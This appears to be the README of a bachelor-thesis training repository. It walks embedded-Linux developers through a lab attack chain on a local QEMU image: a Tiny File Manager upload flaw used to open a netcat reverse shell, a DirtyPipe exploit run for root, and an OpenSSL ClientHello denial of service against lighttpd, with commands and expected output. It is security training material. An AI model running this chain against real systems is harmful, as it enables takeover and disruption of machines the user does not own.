# Analysis of attack vectors for embedded Linux
Git Repository for my Bachelor Thesis "Analysis of attack vectors for embedded Linux"

The goal of this bachelor thesis was to create a training course that would give developers a brief insight into how quickly security vulnerabilities can sometimes be exploited. Unpatched systems can often be very easily taken over or crippled by exploits found on the Internet. To this end, the information gathered in this thesis is to be provided as training. The training is primarily intended for embedded system developers but can be applied to the entire Linux environment. 

The schedule and necessary data for the training can be found in my personal git repository at: https://github.com/FeFi7/attacking_embedded_linux 

Likewise, all patches and layers are provided that the Poky distribution can be extended or changed independently. This includes the layers used as well as the changes to the Poky version used with the status of the checkout 0447aace57d46c4de4d120b430384e99fc3a5e0c used in this thesis.

## Preparation for the training
To be able to carry out the training, a few things have to be prepared. The first step is to ensure that a Linux machine is available as the basic system. This can be any Linux distribution. The commands will be executed using an Ubuntu distribution. First all dependencies have to be installed. This includes qemu, qemu-system. These can be installed with the following commands:

>$ sudo apt-get install qemu 
>
>$ sudo apt-get install qemu-system

Furthermore, the Go ("Golang") programming language must be installed. We achieve this with the help of:
>$ sudo apt install golang-go

Alternatively, wget can be used to download the appropriate package and then install it. 
(wget https://golang.org/dl/go1.17.linux-amd64.tar.gz)

Install curl and jq.

>$ sudo apt-get install curl
>
>$ sudo apt-get install jq

:warning:Because the root file system of the Poky distribution created in this thesis exceeds the 100MB one need to install the GIT extension lfs (Large File Storage).:warning: 

This can be installed as follows:
>$ sudo apt-get install git-lfs 

or alternatively via https://git-lfs.github.com/. To do this, the following steps must be performed:
>$ curl -s https://packagecloud.io/install/repositories /github/git-lfs/script.deb.sh | sudo bash 


The extension must also be used for the repository clone:
>$ git lfs clone https://github.com/FeFi7/attacking_embedded_linux.git 


## Training materials
For the training let's imagine the following scenario: An embedded Linux software developer wants to develop a NAS system. The Tiny File Manger version from chapter 4.3 is installed on it and the system is to be taken over. We got the admin login data for the system through social engineering, or we know that the default configuration has not been changed. In any case, this login data is available to us. The goal is to combine the attacks in such a way that we create a reverse remote shell on the target and use the dirtypipe attack to gain root privileges. In the second step, the web server can be taken down by a DoS attack. This should show how a system can be weakened or taken over. Individual security vulnerabilities may not be bad, but the attack chain used with the combination of security vulnerabilities can lead to a complete takeover of the system. 
Follow all requirements for installation. After the Git repository has been successfully cloned, one need to change to this directory:
>$ cd attacking_embedded_linux/poky

In this directory the startup script is located, which boots the poky distribution. This can be started with the following command:
>$ sudo ./start.sh

Now one must wait until the QEMU has completely booted the distribution and the login prompt appears. As soon as the boot process has been completed, it can be tested with the help of a web browser whether the necessary pages are accessible, for this the following pages must be called:
Lighttpd: https://127.0.0.1:8443
Tiny File Manager Application: https://127.0.0.1:8443/tinyfilemanager.php 
Note: The self-signed certificate must be confirmed the first time it is accessed. 

The login credentials for the necessary applications are:

poky Login: hansolo Password: felix

Tiny File Manager: admin Password: admin@123

After ensuring that all requirements have been installed and the applications are working properly, the first attack can begin.
The first attack involves a combination of the CVE-2021-40964 to get a remote shell on the target system and the execution of an exploit for the CVE-2022-0847 to get root privileges on the system. For this, two shells should be opened on the host system. In the first shell we start netcat with the following command:  
>$ nc -nvlp 9001

In the second terminal we move to the exploit directory of the Tiny File Manager with the command:
>$ cd ../exploits/CVE-2021-40964-tinyfilemanager

This directory contains the exploit to log in to the Tiny File Manager application and upload the shell PHP script. This is executed as follows:
>$ ./exploit.sh https://127.0.0.1:8443/tinyfilemanager.php admin “admin@123”

In the other terminal window, the reverse shell now opens and we have access to the webroot directory of the lighttpd. This can be checked with the following command:
>$ ls -l

To execute the dirtypipe exploit and obtain root rights, the corresponding exploit must be uploaded via the web interface. To do this, the login process must be carried out via the web interface https://127.0.0.1:8443/tinyfilemanager.php with the login credentials 

Login: admin and Password: admin@123. 

Then one has to click on the upload button in the upper right corner and the upload mask will open. With a click in the white area a file explorer opens, where the exploit must be selected. This exploit has the following path: 
>attacking_embedded_linux/ exploits/ CVE-2022-0847-dirtypipe/exploit_bl4sty

Clicking on the Back button returns one to the overview of the files. It is recommended to check whether the exploit was successfully uploaded in the terminal by executing the remote shell. The following command must be executed for the exploit to be executable:
>$ chmod +x exploit_bl4sty

Before the exploit is executed, it should be checked under which user the shell is currently executed. To do this, the command "id" can be typed into the command line. The feedback appears:
>$ uid=33(www-data) gid=33(www-data) groups=33(www-data)

To gain root privileges, the exploit must be executed as follows:
>$ ./exploit_bl4sty /bin/su

Note: After executing the exploit, no new prompt appears only an empty new line.

It is checked whether the exploit was successful. To do this, the command "id" can be executed again in the command line. The feedback message appears:
>$ uid=0(root) gid=0(root) groups=33(www-data)

The system was successfully taken over.
The second attack requires launching the web browser and accessing the following URL: https://127.0.0.1:8443

A static HTML page with the content "Time to shoot the Empire" appears. In a terminal, one must change to the following directory where the exploit is located:
>$ cd attacking_embedded_linux/exploits/CVE-2021-3449-openssl

To execute the exploit, the following command must be run:
>$ go run . -host 127.0.0.1:8443

The feedback is provided:
>sending initial ClientHello
>connected
>sending malicious ClientHello
>malicious handshake failed, exploit might have worked: EOF

Furthermore, the message Error in libssl.so appears in the QEMU Terminal. Now it is necessary to switch back to the web browser and reload the page. The page is now no longer accessible and the lighttpd was taken down.
